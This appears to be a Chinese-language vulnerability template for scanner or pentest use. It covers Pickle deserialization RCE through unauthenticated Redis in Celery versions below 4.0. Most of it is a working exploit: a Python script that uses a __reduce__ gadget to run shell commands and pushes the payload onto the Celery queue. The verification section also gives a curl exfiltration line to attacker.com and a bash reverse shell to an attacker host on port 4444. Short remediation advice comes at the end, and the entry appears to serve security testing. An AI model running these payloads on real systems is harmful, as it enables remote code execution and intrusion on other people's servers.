---
id: CELERY-CELERY3_REDIS_UNAUTH
title: Celery Redis未授权访问+Pickle反序列化漏洞
product: celery
vendor: Celery
version_affected: "<4.0"
severity: CRITICAL
tags: [rce, deserialization, 无需认证]
fingerprint: ["Celery", "Redis", "Pickle"]
---

## 漏洞描述

Celery <4.0版本默认使用Pickle进行任务消息序列化。当Redis等队列服务存在未授权访问时，攻击者可以直接写入Pickle序列化的恶意任务消息，Celery Worker消费时触发反序列化漏洞执行任意代码。

## 影响版本

- Celery < 4.0（使用Pickle序列化）

## 前置条件

- Redis/RabbitMQ等消息中间件存在未授权访问
- Celery使用默认Pickle序列化

## 利用步骤

1. 发现消息中间件未授权访问（Redis默认端口6379）
2. 使用Python脚本构造Pickle序列化恶意任务
3. 将恶意任务写入Celery队列
4. Worker消费任务触发代码执行

## Payload

```python
# exploit.py
import redis
import pickle
import subprocess

# 构造恶意任务（使用ysoserial的Celery版）
class EvilTask:
    def __reduce__(self):
        return (subprocess.Popen, (('bash', '-c', 'touch /tmp/celery_success'),))

r = redis.Redis(host='target', port=6379, db=0)
task = pickle.dumps(EvilTask())
r.lpush('celery', task)

# 或使用已知payload
import base64
payload = base64.b64decode('...')  # ysoserial生成的payload
r.lpush('celery', payload)
```

```bash
# 直接执行
python exploit.py target-ip
```

## 验证方法

```bash
# 此漏洞为blind RCE，通过Redis写入Pickle序列化任务，Worker消费时触发
# 验证方式：使用HTTP回调或反弹shell

# 方法1：HTTP外带验证（推荐）
# 攻击者服务器启动监听: python3 -m http.server 8080
# 修改exploit.py中的payload为:
# curl http://attacker.com/$(whoami)

# 方法2：反弹shell（攻击者服务器监听: nc -lvp 4444）
# 修改exploit.py中__reduce__返回:
# return (subprocess.Popen, (('bash','-c','bash -i >& /dev/tcp/attacker-ip/4444 0>&1'),))

# 检查攻击者服务器是否有回连请求
```

## 修复建议

1. 升级Celery至4.0+并使用JSON序列化
2. 对消息中间件启用认证
3. 限制消息中间件网络访问
4. 启用Celery任务签名验证
